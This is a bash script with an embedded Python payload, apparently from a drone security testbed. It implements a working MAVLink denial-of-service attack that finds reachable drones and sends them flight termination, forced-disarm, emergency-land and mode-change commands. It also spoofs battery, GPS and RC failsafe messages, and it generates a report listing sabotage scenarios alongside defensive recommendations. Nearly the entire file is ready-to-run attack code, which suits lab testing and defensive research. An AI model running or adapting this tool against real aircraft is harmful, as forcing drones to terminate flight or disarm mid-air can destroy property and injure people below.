#!/bin/bash
# flight_termination.sh - 비행 종료 공격 도구
# Path: /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/denial_of_service/flight_termination.sh

source "$(dirname "$0")/../common/colors.sh"
source "$(dirname "$0")/../common/utils.sh"

ATTACK_NAME="Flight Termination Attack"
LOG_FILE="$(get_log_dir)/flight_termination.log"

print_banner() {
    echo -e "${CYAN}"
    echo "╔═══════════════════════════════════════╗"
    echo "║           비행 종료 공격             ║"
    echo "╚═══════════════════════════════════════╝"
    echo -e "${NC}"
}

check_prerequisites() {
    log_info "Checking prerequisites..."
    
    local required_tools=("python3" "pip3")
    for tool in "${required_tools[@]}"; do
        if ! command -v "$tool" &> /dev/null; then
            log_error "$tool is not installed"
            exit 1
        fi
    done
    
    # Python 라이브러리 확인 및 설치
    if ! python3 -c "import pymavlink" 2>/dev/null; then
        log_info "Installing pymavlink..."
        pip3 install pymavlink >/dev/null 2>&1
    fi
    
    log_success "Prerequisites check completed"
}

detect_mavlink_targets() {
    log_info "Detecting MAVLink targets..."
    
    local targets=()
    local network_mode=""
    
    # 네트워크 모드 감지
    if ip addr show | grep -q "192.168.13"; then
        network_mode="wifi"
        targets+=("192.168.13.1:5760" "192.168.13.14:14550")
        log_info "WiFi mode detected"
    elif ip addr show | grep -q "10.13.0"; then
        network_mode="docker"
        targets+=("10.13.0.3:5760" "10.13.0.4:14550")
        log_info "Docker bridge mode detected"
    else
        network_mode="generic"
        targets+=("127.0.0.1:5760" "127.0.0.1:14550")
        log_warning "Generic network mode, using localhost targets"
    fi
    
    echo -e "${CYAN}Potential MAVLink targets:${NC}"
    for target in "${targets[@]}"; do
        echo "  └─ $target"
    done
    
    echo "$network_mode:${targets[*]}"
}

test_mavlink_connectivity() {
    local target="$1"
    
    log_info "Testing connectivity to $target..."
    
    local ip=$(echo "$target" | cut -d: -f1)
    local port=$(echo "$target" | cut -d: -f2)
    
    # 포트 연결 테스트
    if timeout 5 bash -c "</dev/tcp/$ip/$port" 2>/dev/null; then
        log_success "Connection to $target successful"
        return 0
    else
        log_warning "Connection to $target failed"
        return 1
    fi
}

create_flight_termination_script() {
    local script_path="/tmp/flight_termination.py"
    
    cat > "$script_path" << 'EOF'
#!/usr/bin/env python3
"""
비행 종료 공격 스크립트
"""

import sys
import time
from pymavlink import mavutil

class FlightTerminationAttack:
    def __init__(self, target_ip, target_port):
        self.target_ip = target_ip
        self.target_port = target_port
        self.master = None
        self.connect()
    
    def connect(self):
        """드론에 연결"""
        try:
            connection_string = f'tcp:{self.target_ip}:{self.target_port}'
            self.master = mavutil.mavlink_connection(connection_string, timeout=10)
            self.master.wait_heartbeat(timeout=10)
            print(f"[+] Connected to drone at {self.target_ip}:{self.target_port}")
            return True
        except Exception as e:
            print(f"[-] Connection failed: {e}")
            return False
    
    def get_system_status(self):
        """시스템 상태 확인"""
        print("[*] Checking system status...")
        
        try:
            # 하트비트 메시지 요청
            self.master.mav.heartbeat_send(
                mavutil.mavlink.MAV_TYPE_GCS,
                mavutil.mavlink.MAV_AUTOPILOT_INVALID,
                0, 0, 0
            )
            
            # 상태 메시지 수신
            msg = self.master.recv_match(type='HEARTBEAT', blocking=True, timeout=5)
            if msg:
                print(f"[+] System Type: {msg.type}")
                print(f"[+] Autopilot: {msg.autopilot}")
                print(f"[+] Base Mode: {msg.base_mode}")
                print(f"[+] System Status: {msg.system_status}")
                
                # 상태 해석
                if msg.system_status == mavutil.mavlink.MAV_STATE_ACTIVE:
                    print("[+] System is ACTIVE")
                elif msg.system_status == mavutil.mavlink.MAV_STATE_STANDBY:
                    print("[+] System is in STANDBY")
                elif msg.system_status == mavutil.mavlink.MAV_STATE_CRITICAL:
                    print("[!] System is CRITICAL")
                elif msg.system_status == mavutil.mavlink.MAV_STATE_EMERGENCY:
                    print("[!] System is in EMERGENCY")
                
                return True
            else:
                print("[-] No heartbeat received")
                return False
                
        except Exception as e:
            print(f"[-] Status check failed: {e}")
            return False
    
    def execute_flight_termination(self):
        """비행 종료 명령 실행"""
        print("[*] Executing flight termination command...")
        
        try:
            # MAV_CMD_DO_FLIGHTTERMINATION 명령 전송
            self.master.mav.command_long_send(
                self.master.target_system,
                self.master.target_component,
                mavutil.mavlink.MAV_CMD_DO_FLIGHTTERMINATION,
                0,  # confirmation
                1,  # param1: 1 = terminate flight
                0, 0, 0, 0, 0, 0  # unused parameters
            )
            
            print("[+] Flight termination command sent")
            return True
            
        except Exception as e:
            print(f"[-] Flight termination failed: {e}")
            return False
    
    def execute_emergency_land(self):
        """응급 착륙 명령 실행"""
        print("[*] Executing emergency landing command...")
        
        try:
            # MAV_CMD_NAV_LAND 명령 전송
            self.master.mav.command_long_send(
                self.master.target_system,
                self.master.target_component,
                mavutil.mavlink.MAV_CMD_NAV_LAND,
                0,  # confirmation
                0,  # param1: abort alt
                0,  # param2: precision land mode
                0, 0, 0, 0, 0  # lat, lon, alt
            )
            
            print("[+] Emergency landing command sent")
            return True
            
        except Exception as e:
            print(f"[-] Emergency landing failed: {e}")
            return False
    
    def force_disarm(self):
        """강제 무장 해제"""
        print("[*] Forcing disarm...")
        
        try:
            # MAV_CMD_COMPONENT_ARM_DISARM 명령 전송 (강제 모드)
            self.master.mav.command_long_send(
                self.master.target_system,
                self.master.target_component,
                mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM,
                0,  # confirmation
                0,  # param1: 0 = disarm
                21196,  # param2: force disarm magic number
                0, 0, 0, 0, 0
            )
            
            print("[+] Force disarm command sent")
            return True
            
        except Exception as e:
            print(f"[-] Force disarm failed: {e}")
            return False
    
    def set_flight_mode(self, mode_name):
        """비행 모드 변경"""
        print(f"[*] Setting flight mode to {mode_name}...")
        
        try:
            # 모드 매핑
            mode_mapping = {
                'LAND': 9,
                'RTL': 6,
                'STABILIZE': 0,
                'GUIDED': 4,
                'LOITER': 5
            }
            
            if mode_name not in mode_mapping:
                print(f"[-] Unknown mode: {mode_name}")
                return False
            
            mode_id = mode_mapping[mode_name]
            
            # SET_MODE 명령 전송
            self.master.mav.set_mode_send(
                self.master.target_system,
                mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
                mode_id
            )
            
            print(f"[+] Flight mode change to {mode_name} sent")
            return True
            
        except Exception as e:
            print(f"[-] Mode change failed: {e}")
            return False
    
    def trigger_failsafe(self, failsafe_type="battery"):
        """페일세이프 트리거"""
        print(f"[*] Triggering {failsafe_type} failsafe...")
        
        try:
            if failsafe_type == "battery":
                # 배터리 부족 상태 시뮬레이션
                self.master.mav.battery_status_send(
                    id=0,
                    battery_function=mavutil.mavlink.MAV_BATTERY_FUNCTION_ALL,
                    type=mavutil.mavlink.MAV_BATTERY_TYPE_LIPO,
                    temperature=300,  # 30도
                    voltages=[3000, 3000, 3000, 3000, 3000, 3000, 3000, 3000, 3000, 3000],  # 낮은 전압
                    current_battery=1000,  # 1A
                    current_consumed=5000,  # 5Ah 소모
                    energy_consumed=-1,
                    battery_remaining=5  # 5% 남음 (낮은 수준)
                )
                
            elif failsafe_type == "gps":
                # GPS 신호 손실 시뮬레이션
                self.master.mav.gps_raw_int_send(
                    time_usec=int(time.time() * 1e6),
                    fix_type=1,  # No GPS fix
                    lat=0, lon=0, alt=0,
                    eph=9999, epv=9999,  # 높은 오차
                    vel=0, cog=0,
                    satellites_visible=0  # 위성 없음
                )
                
            elif failsafe_type == "rc":
                # RC 신호 손실 시뮬레이션
                self.master.mav.rc_channels_send(
                    time_boot_ms=int(time.time() * 1000),
                    chancount=8,
                    chan1_raw=0, chan2_raw=0, chan3_raw=0, chan4_raw=0,
                    chan5_raw=0, chan6_raw=0, chan7_raw=0, chan8_raw=0,
                    chan9_raw=0, chan10_raw=0, chan11_raw=0, chan12_raw=0,
                    chan13_raw=0, chan14_raw=0, chan15_raw=0, chan16_raw=0,
                    chan17_raw=0, chan18_raw=0,
                    rssi=0  # 신호 강도 0
                )
            
            print(f"[+] {failsafe_type} failsafe triggered")
            return True
            
        except Exception as e:
            print(f"[-] Failsafe trigger failed: {e}")
            return False
    
    def monitor_command_response(self, timeout=10):
        """명령 응답 모니터링"""
        print(f"[*] Monitoring command responses for {timeout} seconds...")
        
        start_time = time.time()
        responses = []
        
        while time.time() - start_time < timeout:
            try:
                msg = self.master.recv_match(blocking=False, timeout=1)
                if msg:
                    msg_type = msg.get_type()
                    
                    if msg_type == 'COMMAND_ACK':
                        responses.append({
                            'command': msg.command,
                            'result': msg.result,
                            'timestamp': time.time()
                        })
                        
                        # 결과 해석
                        result_names = {
                            0: "ACCEPTED",
                            1: "TEMPORARILY_REJECTED", 
                            2: "DENIED",
                            3: "UNSUPPORTED",
                            4: "FAILED",
                            5: "IN_PROGRESS"
                        }
                        
                        result_name = result_names.get(msg.result, f"UNKNOWN({msg.result})")
                        command_name = self.get_command_name(msg.command)
                        
                        print(f"[*] Command {command_name}: {result_name}")
                        
                        if msg.result == mavutil.mavlink.MAV_RESULT_ACCEPTED:
                            print(f"[+] Command {command_name} accepted")
                        else:
                            print(f"[-] Command {command_name} failed: {result_name}")
                    
                    elif msg_type == 'STATUSTEXT':
                        text = msg.text.decode('utf-8', errors='ignore')
                        print(f"[*] Status: {text}")
                    
                    elif msg_type == 'HEARTBEAT':
                        if msg.system_status == mavutil.mavlink.MAV_STATE_EMERGENCY:
                            print("[!] System entered EMERGENCY state")
                        elif msg.system_status == mavutil.mavlink.MAV_STATE_CRITICAL:
                            print("[!] System entered CRITICAL state")
                
                time.sleep(0.1)
                
            except Exception as e:
                print(f"[-] Monitoring error: {e}")
                break
        
        print(f"[+] Monitoring completed. {len(responses)} responses received")
        return responses
    
    def get_command_name(self, command_id):
        """명령 ID를 이름으로 변환"""
        command_names = {
            mavutil.mavlink.MAV_CMD_DO_FLIGHTTERMINATION: "FLIGHT_TERMINATION",
            mavutil.mavlink.MAV_CMD_NAV_LAND: "NAV_LAND",
            mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM: "ARM_DISARM",
            mavutil.mavlink.MAV_CMD_NAV_RETURN_TO_LAUNCH: "RTL"
        }
        return command_names.get(command_id, f"CMD_{command_id}")
    
    def comprehensive_termination_attack(self):
        """종합적인 비행 종료 공격"""
        print("[*] Starting comprehensive flight termination attack...")
        
        attack_sequence = [
            ("Status Check", self.get_system_status),
            ("Flight Termination", self.execute_flight_termination),
            ("Emergency Landing", self.execute_emergency_land),
            ("Force Landing Mode", lambda: self.set_flight_mode("LAND")),
            ("Battery Failsafe", lambda: self.trigger_failsafe("battery")),
            ("GPS Failsafe", lambda: self.trigger_failsafe("gps")),
            ("RC Failsafe", lambda: self.trigger_failsafe("rc")),
            ("Force Disarm", self.force_disarm)
        ]
        
        results = {}
        
        for name, func in attack_sequence:
            print(f"\n[*] Executing: {name}")
            try:
                result = func()
                results[name] = result
                
                if result:
                    print(f"[+] {name}: SUCCESS")
                else:
                    print(f"[-] {name}: FAILED")
                
                # 명령 응답 모니터링
                responses = self.monitor_command_response(5)
                
                # 단계별 대기
                time.sleep(3)
                
            except Exception as e:
                print(f"[-] {name} error: {e}")
                results[name] = False
        
        # 결과 요약
        print(f"\n[+] Attack sequence completed")
        successful = sum(1 for r in results.values() if r)
        total = len(results)
        print(f"[+] Success rate: {successful}/{total} ({successful*100//total}%)")
        
        return results

def main():
    if len(sys.argv) != 4:
        print("Usage: python3 flight_termination.py <ip> <port> <action>")
        print("Actions:")
        print("  status           - Check system status")
        print("  terminate        - Execute flight termination")
        print("  emergency_land   - Emergency landing")
        print("  force_disarm     - Force disarm")
        print("  land_mode        - Set to LAND mode")
        print("  trigger_battery  - Trigger battery failsafe")
        print("  trigger_gps      - Trigger GPS failsafe")
        print("  trigger_rc       - Trigger RC failsafe")
        print("  comprehensive    - Full termination attack")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    action = sys.argv[3]
    
    # 공격 객체 생성
    attack = FlightTerminationAttack(target_ip, target_port)
    
    if not attack.master:
        print("[-] Failed to connect to target")
        sys.exit(1)
    
    # 액션 실행
    if action == "status":
        attack.get_system_status()
    elif action == "terminate":
        attack.execute_flight_termination()
        attack.monitor_command_response()
    elif action == "emergency_land":
        attack.execute_emergency_land()
        attack.monitor_command_response()
    elif action == "force_disarm":
        attack.force_disarm()
        attack.monitor_command_response()
    elif action == "land_mode":
        attack.set_flight_mode("LAND")
        attack.monitor_command_response()
    elif action == "trigger_battery":
        attack.trigger_failsafe("battery")
        attack.monitor_command_response()
    elif action == "trigger_gps":
        attack.trigger_failsafe("gps")
        attack.monitor_command_response()
    elif action == "trigger_rc":
        attack.trigger_failsafe("rc")
        attack.monitor_command_response()
    elif action == "comprehensive":
        attack.comprehensive_termination_attack()
    else:
        print(f"[-] Unknown action: {action}")

if __name__ == "__main__":
    main()
EOF

    chmod +x "$script_path"
    echo "$script_path"
}

execute_termination_attack() {
    local target="$1"
    local attack_type="$2"
    
    log_info "Executing flight termination attack against $target..."
    
    local ip=$(echo "$target" | cut -d: -f1)
    local port=$(echo "$target" | cut -d: -f2)
    
    local script_path=$(create_flight_termination_script)
    
    echo -e "${YELLOW}[*] Target: $target${NC}"
    echo -e "${YELLOW}[*] Attack Type: $attack_type${NC}"
    echo -e "${CYAN}[*] Executing attack...${NC}"
    
    local attack_output=""
    local success=false
    
    case "$attack_type" in
        "terminate")
            echo -e "${RED}[!] Executing flight termination${NC}"
            attack_output=$(python3 "$script_path" "$ip" "$port" "terminate" 2>&1)
            [[ $? -eq 0 ]] && success=true
            ;;
        "emergency_land")
            echo -e "${RED}[!] Forcing emergency landing${NC}"
            attack_output=$(python3 "$script_path" "$ip" "$port" "emergency_land" 2>&1)
            [[ $? -eq 0 ]] && success=true
            ;;
        "force_disarm")
            echo -e "${RED}[!] Force disarming drone${NC}"
            attack_output=$(python3 "$script_path" "$ip" "$port" "force_disarm" 2>&1)
            [[ $? -eq 0 ]] && success=true
            ;;
        "failsafe_cascade")
            echo -e "${RED}[!] Triggering failsafe cascade${NC}"
            # 연속적으로 여러 페일세이프 트리거
            attack_output+=$(python3 "$script_path" "$ip" "$port" "trigger_battery" 2>&1)
            sleep 2
            attack_output+=$(python3 "$script_path" "$ip" "$port" "trigger_gps" 2>&1)
            sleep 2
            attack_output+=$(python3 "$script_path" "$ip" "$port" "trigger_rc" 2>&1)
            [[ $? -eq 0 ]] && success=true
            ;;
        "comprehensive")
            echo -e "${RED}[!] Comprehensive termination attack${NC}"
            attack_output=$(python3 "$script_path" "$ip" "$port" "comprehensive" 2>&1)
            [[ $? -eq 0 ]] && success=true
            ;;
    esac
    
    echo "$attack_output"
    
    if $success; then
        log_success "Flight termination attack executed successfully"
    else
        log_warning "Flight termination attack may have failed"
    fi
    
    rm -f "$script_path"
    
    echo "$success:$attack_output"
}

check_system_status() {
    local target="$1"
    
    log_info "Checking system status..."
    
    local ip=$(echo "$target" | cut -d: -f1)
    local port=$(echo "$target" | cut -d: -f2)
    
    local script_path=$(create_flight_termination_script)
    
    echo -e "${CYAN}Checking system status of $target...${NC}"
    
    local status_output=$(python3 "$script_path" "$ip" "$port" "status" 2>&1)
    
    echo "$status_output"
    
    # 상태 분석
    if echo "$status_output" | grep -q "System is ACTIVE"; then
        echo -e "${GREEN}  └─ System is operational${NC}"
    elif echo "$status_output" | grep -q "System is in STANDBY"; then
        echo -e "${YELLOW}  └─ System is in standby mode${NC}"
    elif echo "$status_output" | grep -q "System is CRITICAL\|System is in EMERGENCY"; then
        echo -e "${RED}  └─ System is in critical/emergency state${NC}"
    else
        echo -e "${YELLOW}  └─ System status unknown${NC}"
    fi
    
    rm -f "$script_path"
}

perform_systematic_termination() {
    local target="$1"
    
    log_info "Performing systematic flight termination..."
    
    local termination_methods=(
        "terminate:Direct flight termination"
        "emergency_land:Emergency landing command"
        "force_disarm:Forced disarmament"
        "failsafe_cascade:Cascading failsafe triggers"
    )
    
    echo -e "${GREEN}=== Systematic Flight Termination ===${NC}"
    
    local method_results=()
    local successful_methods=0
    
    for method in "${termination_methods[@]}"; do
        local attack_type=$(echo "$method" | cut -d: -f1)
        local description=$(echo "$method" | cut -d: -f2)
        
        echo -e "\n${CYAN}[*] Method: $description${NC}"
        
        local result=$(execute_termination_attack "$target" "$attack_type")
        local success=$(echo "$result" | cut -d: -f1)
        
        if [[ "$success" == "true" ]]; then
            ((successful_methods++))
            method_results+=("$description:SUCCESS")
            echo -e "${GREEN}  └─ Method succeeded${NC}"
        else
            method_results+=("$description:FAILED")
            echo -e "${RED}  └─ Method failed${NC}"
        fi
        
        # 메소드 간 대기
        sleep 5
    done
    
    echo -e "\n${GREEN}=== Termination Summary ===${NC}"
    echo "  └─ Total methods: ${#termination_methods[@]}"
    echo "  └─ Successful methods: $successful_methods"
    echo "  └─ Success rate: $((successful_methods * 100 / ${#termination_methods[@]}))%"
    
    echo -e "\n${CYAN}Method Details:${NC}"
    for result in "${method_results[@]}"; do
        local desc=$(echo "$result" | cut -d: -f1)
        local status=$(echo "$result" | cut -d: -f2)
        
        if [[ "$status" == "SUCCESS" ]]; then
            echo "  └─ $desc: ${GREEN}$status${NC}"
        else
            echo "  └─ $desc: ${RED}$status${NC}"
        fi
    done
    
    echo "$successful_methods:${#termination_methods[@]}"
}

generate_termination_report() {
    local target="$1"
    local attack_summary="$2"
    
    log_info "Generating flight termination attack report..."
    
    local successful=$(echo "$attack_summary" | cut -d: -f1)
    local total=$(echo "$attack_summary" | cut -d: -f2)
    local success_rate=$((successful * 100 / total))
    
    local report_file="$(get_log_dir)/flight_termination_report_$(date +%Y%m%d_%H%M%S).txt"
    
    cat > "$report_file" << EOF
╔═══════════════════════════════════════════════════╗
║             비행 종료 공격 보고서                 ║
╚═══════════════════════════════════════════════════╝

Date: $(date)
Attack Type: Flight Termination
Target: $target
Success Rate: ${success_rate}% (${successful}/${total})

╔═══ ATTACK SUMMARY ═══╗

Target System: MAVLink Drone
Attack Vector: Command Injection
Protocol: MAVLink (TCP)
Commands Used:
  - MAV_CMD_DO_FLIGHTTERMINATION
  - MAV_CMD_NAV_LAND
  - MAV_CMD_COMPONENT_ARM_DISARM
  - Failsafe triggers

╔═══ ATTACK EXECUTION ═══╗

$(cat "$LOG_FILE" | grep -A 20 "Systematic Flight Termination" | tail -20)

╔═══ SECURITY IMPLICATIONS ═══╗

1. Command Authority
   - Unauthorized flight termination capability
   - Emergency command execution
   - Safety system override

2. Flight Safety Impact
   - Immediate flight termination
   - Forced emergency landing
   - System shutdown commands

3. Operational Consequences
   - Mission interruption
   - Asset loss potential
   - Safety protocol violation

╔═══ ATTACK CAPABILITIES ═══╗

1. Direct Termination
   - Flight termination command
   - Immediate system shutdown
   - Motor stop functionality

2. Emergency Procedures
   - Forced emergency landing
   - Automatic RTL override
   - Failsafe activation

3. System Disarmament
   - Motor disarming commands
   - Safety system bypass
   - Control authority seizure

╔═══ EXPLOITATION SCENARIOS ═══╗

1. Mission Sabotage
   - Critical mission interruption
   - Asset denial operations
   - Operational disruption

2. Safety Override
   - Emergency procedure hijacking
   - Failsafe system abuse
   - Control system takeover

3. Asset Seizure
   - Forced landing in specific location
   - Physical asset recovery
   - Operational asset denial

╔═══ DEFENSIVE RECOMMENDATIONS ═══╗

1. 명령 인증
   - MAVLink 명령 서명 활성화
   - 중요 명령 2단계 인증
   - 권한 기반 명령 제어

2. 시스템 강화
   - 응급 명령 로깅
   - 비정상 명령 탐지
   - 명령 실행 지연 구현

3. 운영 절차
   - 명령 소스 검증
   - 응급 상황 모니터링
   - 백업 제어 시스템

╚═══════════════════════╝
EOF

    log_success "Report saved to: $report_file"
    echo -e "${GREEN}Report location: $report_file${NC}"
}

cleanup() {
    log_info "Cleaning up temporary files..."
    rm -f /tmp/flight_termination.py 2>/dev/null
}

main() {
    print_banner
    check_prerequisites
    
    log_info "Starting flight termination attack..."
    echo "Attack: $ATTACK_NAME" >> "$LOG_FILE"
    echo "Timestamp: $(date)" >> "$LOG_FILE"
    echo "================================" >> "$LOG_FILE"
    
    # MAVLink 타겟 탐지
    local target_info=$(detect_mavlink_targets)
    local network_mode=$(echo "$target_info" | cut -d: -f1)
    local targets=($(echo "$target_info" | cut -d: -f2-))
    
    # 연결 가능한 타겟 찾기
    local active_target=""
    for target in "${targets[@]}"; do
        if test_mavlink_connectivity "$target"; then
            active_target="$target"
            break
        fi
    done
    
    if [[ -z "$active_target" ]]; then
        log_error "No active MAVLink targets found"
        exit 1
    fi
    
    echo -e "\n${BLUE}[*] Active target: $active_target${NC}"
    
    # 시스템 상태 확인
    echo -e "\n${BLUE}[*] Checking system status...${NC}"
    check_system_status "$active_target" | tee -a "$LOG_FILE"
    
    # 종료 공격 실행
    echo -e "\n${BLUE}[*] Executing termination attacks...${NC}"
    local attack_summary=$(perform_systematic_termination "$active_target")
    
    # 보고서 생성
    generate_termination_report "$active_target" "$attack_summary"
    
    cleanup
    
    log_success "Flight termination attack completed"
    echo "Attack completed at $(date)" >> "$LOG_FILE"
}

# Signal handlers for graceful cleanup
trap cleanup EXIT
trap 'echo -e "\n${RED}Attack interrupted${NC}"; cleanup; exit 1' INT TERM

# Execute main function
main "$@"